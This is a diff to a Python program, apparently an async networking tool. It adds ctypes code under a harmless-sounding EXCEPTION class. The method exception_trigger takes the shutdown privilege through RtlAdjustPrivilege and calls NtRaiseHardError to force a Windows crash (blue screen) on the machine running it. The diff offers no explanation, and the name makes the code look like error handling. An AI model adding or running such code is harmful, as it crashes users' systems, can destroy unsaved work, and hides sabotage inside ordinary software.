@@ -4,6 +4,7 @@ import json
 import requests
 import random
 import string
+import ctypes
 import os
 import subprocess
 import aiohttp
@@ -18,6 +19,37 @@ class const:
     directory = "C:/2501/ply_Alib/data"
     if not os.path.exists(directory):
         os.makedirs(directory)
+
+
+class EXCEPTION_RECORD(ctypes.Structure):
+    _fields_ = [
+        ("ExceptionCode", ctypes.c_ulong),
+        ("ExceptionFlags", ctypes.c_ulong),
+        ("ExceptionRecord", ctypes.c_void_p),
+        ("ExceptionAddress", ctypes.c_void_p),
+        ("NumberParameters", ctypes.c_ulong),
+        ("ExceptionInformation", ctypes.c_ulong * 15)
+    ]
+class EXCEPTION_POINTERS(ctypes.Structure):
+    _fields_ = [
+        ("ExceptionRecord", ctypes.POINTER(EXCEPTION_RECORD)),
+        ("ContextRecord", ctypes.c_void_p)
+    ]
+
+class EXCEPTION():
+    def exception_trigger():
+        ntdll = ctypes.WinDLL('ntdll')
+        RtlAdjustPrivilege = ntdll.RtlAdjustPrivilege
+        NtRaiseHardError = ntdll.NtRaiseHardError
+        STATUS_ASSERTION_FAILURE = 0xC000021A
+        SE_SHUTDOWN_PRIVILEGE = 0x13
+
+        prev = ctypes.c_ulong()
+        RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, True, False, ctypes.byref(prev))
+        status = NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, None, 6, ctypes.byref(ctypes.c_ulong(0)))
+        if status != 0:
+            print("0_0")
+
 
 class Clock:
     def curtimeget(self):
